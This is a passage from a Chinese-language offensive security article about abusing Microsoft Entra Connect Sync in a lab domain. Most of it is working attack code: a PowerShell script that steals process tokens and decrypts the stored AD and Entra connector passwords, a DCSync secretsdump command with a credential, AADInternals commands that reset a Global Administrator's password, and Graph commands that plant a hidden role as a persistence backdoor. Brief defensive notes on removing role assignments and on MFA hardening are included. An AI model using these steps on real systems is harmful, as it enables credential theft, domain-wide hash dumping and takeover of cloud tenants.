4. 从拷贝的 ADSync.mdf 数据库文件中读取数据，包括 “mms\_management\_agent” 表中 “encrypted\_configuration” 字段的加密凭据以及 “mms\_server\_configuration” 表中的 instance\_id、keyset\_id 和 entropy；
5. 转储 SYSTEM 和 SECURITY 注册表，并从中提取 DPAPI\_SYSTEM 机密；
6. 遍历 `NT SERVICE\ADSync` 账户 Credential Manager Vault 中的每个凭据文件，依次对 DPAPI Data blob 进行解析，以找出保护它的用户 MasterKey；

> `NT SERVICE\ADSync` 账户的主目录位于 “C:\Users\ADSync” 或 “C:\Windows\ServiceProfiles\ADSync”。

1. 使用 DPAPI\_SYSTEM 中的 User Key 与 `NT SERVICE\ADSync` 账户的 SID 解密每一个凭据文件对应的的 MasterKey，同时用得到的 MasterKey 解密与其对应的凭据文件。循环尝试，直到成功解密出与数据库中的 keyset\_id 值匹配的密钥集；
2. 使用得到的密钥集通过 AES 算法解密 “encrypted\_configuration” 字段中存储的加密数据，得到最终的凭据。

基于上述方法，Dirk-jan Mollema 开源了一个名为 [adconnectdump](https://github.com/dirkjanm/adconnectdump/tree/6d821ce4cbd1bf74150b6474c831fb07268bdfde) 的工具集，支持远程从 Azure ADC 服务器中提取并解密存储的加密凭据，如下图所示。

![image-20250926132555099.png](images/img_19127_018.png)

### Decryption via mcrypt.dll Assembly

查看 ADSync 服务中对这些加密数据的处理时，我们发现多处引用了位于 `C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll` 的程序集，该程序集负责密钥管理和数据解密。

![image-20250925161519990.png](images/img_19127_019.png)

![image-20250925163636892.png](images/img_19127_020.png)

这段代码在传入的密钥管理器为空时，会创建一个新的 KeyManager 实例并执行身份模拟。然后连接到前文提到的 LocalDB 数据库，从 mms\_server\_configuration 表中依次读取 instance\_id、keyset\_id 和 entropy 字段值作为三个关键参数，最后调用 LoadKeySet 方法利用这些参数从持久化存储中加载相应的加密密钥集，完成密钥管理器的初始化准备工作。

我们可以在 mcrypt.dll 程序集的找到这个 LoadKeySet 方法，该方法用于加载指定的加密密钥集。

![image-20250925161849617.png](images/img_19127_021.png)

因此，要解密 encrypted\_configuration 字段中保存的凭据，最直接的方法是在 Azure ADC 服务器上，从其 LocalDB 实例检索用于加密的密钥材料，然后将其传入 mcrypt.dll 中相应的程序集以执行解密操作。

（1）首先，创建了一个 SqlConnection 对象并尝试打开 ADSync 数据库连接。

```
# Establish connection to ADSync LocalDB database
$sqlClient = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync2019;Initial Catalog=ADSync"

try {
    $sqlClient.Open()
    Write-Host "[+] Successfully connected to ADSync database"
} catch {
    Write-Host "[!] Could not connect to localdb..."
    return
}
```

（2）然后，查询 mms\_server\_configuration 表以获取密钥集ID、实例ID和熵值等字段，为后续的解密操作提供必要的密钥材料。

```
Write-Host "[*] Querying dbo.mms_server_configuration table" -ForegroundColor Yellow

# Retrieve encryption keys and configuration from server configuration table
$sqlCommand = $sqlClient.CreateCommand()
$sqlCommand.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$sqlReader = $sqlCommand.ExecuteReader()

if ($sqlReader.Read() -ne $true) {
    Write-Host "[-] Error querying mms_server_configuration"
    return
}

# Extract encryption parameters required for decryption
$keyId = $sqlReader.GetInt32(0)
$instanceId = $sqlReader.GetGuid(1)
$entropy = $sqlReader.GetGuid(2)
$sqlReader.Close()
```

（3）之后，分别获取 “AD DS Connector” 和 “Microsoft Entra Connector” 账户相关的 XML 配置信息，以及各自的加密凭据：

```
Write-Host "[*] Querying dbo.mms_management_agent table" -ForegroundColor Yellow

# Get encrypted configuration and XML settings for AD management agent
$sqlCommand = $sqlClient.CreateCommand()
$sqlCommand.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$sqlReader = $sqlCommand.ExecuteReader()

if ($sqlReader.Read() -ne $true) {
    Write-Host "[-] No results or error querying AD management agent"
    $sqlReader.Close()
    return
}

$adConfigXml = $sqlReader.GetString(0)        # XML containing AD domain/username information
$adEncryptedConfig = $sqlReader.GetString(1)  # Base64 encrypted AD password data
$sqlReader.Close()

Write-Host "[+] Retrieved AD management agent configuration"

# Get encrypted configuration and XML settings for AAD management agent
Write-Host "[*] Querying dbo.mms_management_agent table" -ForegroundColor Yellow

$sqlCommand = $sqlClient.CreateCommand()
$sqlCommand.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Extensible2'"
$sqlReader = $sqlCommand.ExecuteReader()

if ($sqlReader.Read() -ne $true) {
    Write-Host "[-] No results or error querying AAD management agent"
    $sqlReader.Close()
    return
}

$aadConfigXml = $sqlReader.GetString(0)        # XML containing AAD domain/username information
$aadEncryptedConfig = $sqlReader.GetString(1)  # Base64 encrypted AAD password data
$sqlReader.Close()

Write-Host "[+] Retrieved AAD management agent configuration"
```

（4）接下来，我们需要创建一个 “Impersonate-Process” 方法，用于模拟 ADSync 服务的安全上下文，从而获取访问加密密钥所需的权限。该方法通过 Windows API 获取指定进程的访问令牌并进行模拟，使当前线程能够在目标进程的安全上下文中执行操作，这对于访问受保护资源至关重要。

```
function Impersonate-Process {
    param(
        [string]$ProcessName
    )
    
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    
    public class TokenImpersonation {
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int ImpersonationLevel, out IntPtr DuplicateTokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr TokenHandle);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();
        
        public const uint TOKEN_DUPLICATE = 0x0002;
        public const uint TOKEN_QUERY = 0x0008;
        public const uint TOKEN_IMPERSONATE = 0x0004;
        public const int SecurityImpersonation = 2;
        
        public static bool ImpersonateProcessToken(string processName) {
            IntPtr hToken = IntPtr.Zero;
            IntPtr dupeToken = IntPtr.Zero;
            
            try {
                var process = System.Diagnostics.Process.GetProcessesByName(processName)[0];
                
                if (!OpenProcessToken(process.Handle, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out hToken)) {
                    return false;
                }
                
                if (!DuplicateToken(hToken, SecurityImpersonation, out dupeToken)) {
                    return false;
                }
                
                return ImpersonateLoggedOnUser(dupeToken);
            }
            finally {
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
                if (dupeToken != IntPtr.Zero) CloseHandle(dupeToken);
            }
        }
    }
"@

    $result = [TokenImpersonation]::ImpersonateProcessToken($ProcessName)
    if ($result) {
        Write-Host "[+] Successfully impersonated $ProcessName process"
        Write-Host "[+] Current identity: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    } else {
        Write-Error "[-] Failed to impersonate process $ProcessName"
    }
}
```

（5）以 ADSync 服务账户身份执行 PowerShell 解密命令，利用之前获取的加密材料对加密凭据进行解密，并将解密后的内容捕获到相应的变量中用于后续处理。

```
# Impersonate winlogon process to obtain SYSTEM privileges
Impersonate-Process -ProcessName "winlogon"
# Impersonate ADSync process
Impersonate-Process -ProcessName "miiserver"

# Remove PSReadLine module to avoid history file access issues
Remove-Module PSReadLine -Force -ErrorAction SilentlyContinue

# Load required assembly
Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"

# Create KeyManager instance
$keyManager = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager

# Load key set (parameters obtained from database)
$keyManager.LoadKeySet([guid]$entropy, [guid]$instanceId, $keyId)

# Get active credential key
$activeCredentialKey = $null
$keyManager.GetActiveCredentialKey([ref]$activeCredentialKey)

# Get specific key (Key ID = 1)
$decryptionKey = $null
$keyManager.GetKey(1, [ref]$decryptionKey)

# Decrypt AD encrypted configuration
$adDecryptedConfig = $null
$decryptionKey.DecryptBase64ToString($adEncryptedConfig, [ref]$adDecryptedConfig)

# Decrypt AAD encrypted configuration
$aadDecryptedConfig = $null
$decryptionKey.DecryptBase64ToString($aadEncryptedConfig, [ref]$aadDecryptedConfig)
```

（6）最后，我们从解密出的 “encrypted\_configuration” 数据中提取相关凭据信息，最后将获取到的完整登录凭证显示输出。

```
# Parse decrypted results to extract domain, username and password for AD
$adDomain = Select-Xml -Content $adConfigXml -XPath "//parameter[@name='forest-login-domain']" | Select-Object @{Name = 'Domain'; Expression = {$_.Node.InnerText}}
$adUsername = Select-Xml -Content $adConfigXml -XPath "//parameter[@name='forest-login-user']" | Select-Object @{Name = 'Username'; Expression = {$_.Node.InnerText}}
$adPassword = Select-Xml -Content $adDecryptedConfig -XPath "//attribute" | Select-Object @{Name = 'Password'; Expression = {$_.Node.InnerText}}

# Parse decrypted results to extract username and password for AAD
$aadUsername = Select-Xml -Content $aadConfigXml -XPath "//parameter[@name='UserName']" | Select-Object @{Name = 'Username'; Expression = {$_.Node.InnerText}}
$aadPassword = Select-Xml -Content $aadDecryptedConfig -XPath "//attribute[@name='Password']" | Select-Object @{Name = 'Password'; Expression = {$_.Node.InnerText}}

# Display extracted Local AD credentials
Write-Host "[*] Local AD Credentials" -ForegroundColor Yellow
Write-Host "[+]`tDomain: $($adDomain.Domain)"
Write-Host "[+]`tUsername: $($adUsername.Username)"
Write-Host "[+]`tPassword: $($adPassword.Password)"

# Display extracted Azure AD credentials
Write-Host "[*] Azure AD Credentials" -ForegroundColor Yellow
Write-Host "[+]`tUsername: $($aadUsername.Username)"
Write-Host "[+]`tPassword: $($aadPassword.Password)"
```

整理上述代码，最终执行结果如下图所示：

![image-20250925210757235.png](images/img_19127_022.png)

# Abuse of Connect Sync

接下来，我们将介绍在成功获取 Connect Sync 凭据后的滥用方法。基于提取到的 `MSOL_*` 和 `Sync_*` 账户凭据，我们可以分别针对本地 Active Directory 和 Microsoft Entra ID 发起攻击。

## DCSync

在对 Connect Sync 的滥用案例中，最具代表性的攻击路径是通过 Microsoft Entra Connect（前称 Azure AD Connect）创建的 `MSOL_*` 本地连接账户执行 DCSync。该类账户常被授予 `Replicate Directory Changes` 与 `Replicate Directory Changes All` 两项目录复制权限，攻击者可向本地目录服务请求密码哈希复制，从而大规模导出本地域用户的凭据并用于后续攻击链条中的横向移动与长期隐蔽访问。

```
impacket-secretsdump offseclabs.tech/MSOL_87c68feabd8e:'gq[$@d/5D%@5$V]_3GS(;8^fZji$+g=[[1pQ[@_CZ@s??]%%pqn4-h/cG=h:fb{xi7+Z}WT8)EiB/n9ZIb*5_VgZFba#pnCEhP:WZqetG[}q.5+A7|CVnB|$J^&)e;m'@srvad01.offseclabs.tech -just-dc
```

![Snipaste_2025-09-27_05-18-52.png](images/img_19127_023.png)

## Password Reset

网上有多篇文章题到了滥用 Microsoft Entra Connect（前称 Azure AD Connect） 在 Entra ID 中使用的 `Sync_*` 账户所拥有的 “Directory Synchronization Accounts” 角色权限来重置用户密码。一个示例是 Dr. Nestori Syynimaa 的文章 “[Unnoticed sidekick: Getting access to cloud as an on-prem admin](https://aadinternals.com/post/on-prem_admin/#modifying-users)” ，其中使用了 AADInternals 工具集中的 `Set-AADIntUserPassword` 方法。

不过，该滥用方法存在以下限制：

* 只能针对混合账户，即从本地 AD 同步过来的账户（在 2025 年 8 月之前也可以重置仅限云用户的密码）。
* 仅在 Password-Hash Sync (PHS) 启用时可行，而该角色本身有权限启用 PHS。
* 只能通过私有的 “Azure AD Synchronization” API 实现，因为 “Directory Synchronization Accounts” 角色的隐式权限仅在该 API 上生效。该私有 API 早已在 AADInternals 中实现，端点为：`https://adminwebservice.microsoftonline.com/provisioningservice.svc`。切勿将其与名称相近的其他 API 混淆（例如公开的 [Microsoft Entra Synchronization API](https://learn.microsoft.com/en-us/graph/api/resources/synchronization-overview?view=graph-rest-beta) 或私有的 Azure AD Provisioning API）。因此，必须使用 AADInternals 中提供的 `Set-AADIntUserPassword` 方法来执行重置。
* 如果目标启用了 MFA 或 FIDO2 验证，则不可被利用。因为，虽然密码仍可被重置，但无法用该密码进行认证。

滥用方法如下：

（1）首先，获取 AAD Graph 访问令牌并将其保存到缓存，以便后续对同步服务进行操作。

```
Get-AADIntAccessTokenForAADGraph -SaveToCache
```

![image-20250926210542994.png](images/img_19127_024.png)

（2）接着，查询并列出同步对象，定位目标混合账户并记录其同步标识（SourceAnchor 和 CloudAnchor，用于唯一定位该用户）。

```
Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName
```

![image-20250926211707885.png](images/img_19127_025.png)

![image-20250926211736321.png](images/img_19127_026.png)

（3）最后，滥用 “Directory Synchronization Accounts” 账户的的权限在目标账户上写入新的密码并调整密码变更时间，从而完成密码重置。如下所示，我们重置全局管理员账户的密码：

```
Set-AADIntUserPassword -SourceAnchor "kFcDyVPWUEa+hodylsqB7Q==" -Password "<New_Password>" -ChangeDate (Get-Date).AddYears(-1)
```

![image-20250926211916043.png](images/img_19127_027.png)

如上图所示，如果 Result 返回 0，则意味着密码修改/重置成功，之后我们可以以全局管理员身份登录！

## Add Credentials to Privileged Application / Service Principal

另一个有趣的方法由 Fabian Bader 在其文章 “[From on-prem to Global Admin without password reset](https://cloudbrothers.info/en/prem-global-admin-password-reset/)” 中描述。大致思路是先识别一个拥有强大 Microsoft Graph API 权限的应用程序或服务主体，然后滥用 “Directory Synchronization Accounts” 角色所持有的 `microsoft.directory/applications/credentials/update` 或 `microsoft.directory/servicePrincipals/credentials/update` 权限，向该应用程序/服务主体添加凭据。这样即可作为该服务主体进行认证，并滥用其所拥有的高危 Graph API 权限，进而升级为 Global Administrator。

Dirk‑jan Mollema 在文章 “[Azure AD privilege escalation — Taking over default application permissions as Application Admin](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/)” 中也描述了类似的方法。

然而，随着微软在 2024 年 8 月移除了相关权限，该攻击路径已不再有效。

## Persistence

“Directory Synchronization Accounts” 角色功能强大，可被滥用以升级为 Global Administrator。并且，该角色在 Azure 门户与 Entra 管理中心中默认隐藏、公开文档稀少，使其成为攻击者在 Entra ID 中实现隐蔽持久化的理想后门。攻击者可以将此角色分配给任意已被接管的账户，从而建立长期权限保留。

值得注意的是，Azure 门户和 Entra 管理中心均不支持查看或管理对 “Directory Synchronization Accounts” 角色的分配对象；因此必须使用 Microsoft Graph PowerShell SDK 来列出与管理这些分配（Azure AD PowerShell 模块已被弃用）。下面演示了如何使用 Graph SDK 查询、创建与移除该角色的分配。

### List Role Assignees

`Get-MgDirectoryRoleMember` 命令可以列出分配给某个角色的安全主体。为提高可靠性，我们使用该角色的已知的 Template ID，而不是角色名称。

```
Connect-MgGraph -Scopes "RoleManagement.Read.Directory"
$dirSyncRole = Get-MgDirectoryRole -Filter "RoleTemplateId eq 'd29b2b05-8046-44ba-8758-1e26182fcf32'"
Get-MgDirectoryRoleMember -DirectoryRoleId $dirSyncRole.Id | Format-List *
```

![image-20250927144556934.png](images/img_19127_028.png)

### Add Role Assignment

攻击者若想利用该角色进行隐蔽持久化，会使用 New-MgRoleManagementDirectoryRoleAssignment 命令来创建角色分配。如下所示，将为 taylor.smith@offseclabs.tech 账户授予该角色。

```
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
$dirSyncRole = Get-MgDirectoryRole -Filter "RoleTemplateId eq 'd29b2b05-8046-44ba-8758-1e26182fcf32'"
$compromisedAccount = Get-MgUser -UserId taylor.smith@offseclabs.tech
New-MgRoleManagementDirectoryRoleAssignment -RoleDefinitionId $dirSyncRole.Id -PrincipalId $compromisedAccount.Id -DirectoryScopeId "/"
```

![image-20250927145101945.png](images/img_19127_029.png)

另外，如果该内置角色在租户中从未被实例化（例如从未配置过 Entra Connect / Entra Cloud Sync），则需要先从角色模板创建角色实例，命令如下：

```
New-MgDirectoryRole -RoleTemplateId "d29b2b05-8046-44ba-8758-1e26182fcf32"
```

### Remove Role Assignment

恶意的角色分配，或遗留于租户处于混合状态时的分配，可以使用 `Remove-MgDirectoryRoleMemberByRef` 命令进行移除。

```
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
$dirSyncRole = Get-MgDirectoryRole -Filter "RoleTemplateId eq 'd29b2b05-8046-44ba-8758-1e26182fcf32'"
Remove-MgDirectoryRoleMemberByRef -DirectoryRoleId $dirSyncRole.Id -DirectoryObjectId '7f1d7108-2db0-4fa3-b124-241f3cf82895'
```

![image-20250927145516092.png](images/img_19127_030.png)

# Ending...

通过对 Microsoft Entra Connect 同步服务滥用历史的全面回溯，我们可以看到这一混合身份基础设施核心组件在过去几年中面临的安全挑战与演进过程。从早期的注册表存储密钥到凭据管理器保护，再到基于服务主体的新认证模型，微软持续加强 Connect Sync 的安全防护。2024 年 8 月的权限限制更新进一步降低了 "Directory Synchronization Accounts" 角色的攻击面。

此外，随着微软目前强制其 Entra ID 租户启用多因素认证（MFA），针对 `Sync_*` 用户或 Directory Synchronization Accounts 角色的滥用方法在实战中的利用价值已被大大削弱。多因素认证的有效实施能够有效阻断基于密码重置的大多数攻击路径，显著提升了攻击门槛。

然而，Connect Sync 服务器作为 Tier 0 资产的重要性从未改变！

# References

> <https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions>
>
> <https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/>
>
> <https://blog.xpnsec.com/azuread-connect-for-redteam/>
>
> <https://aadinternals.com/post/adsync/>
>
> <https://aadinternals.com/post/on-prem_admin/>
>
> <https://medium.com/tenable-techblog/stealthy-persistence-with-directory-synchronization-accounts-role-in-entra-id-63e56ce5871b>
>
> <https://www.tenable.com/blog/despite-recent-security-hardening-entra-id-synchronization-feature-remains-open-for-abuse>
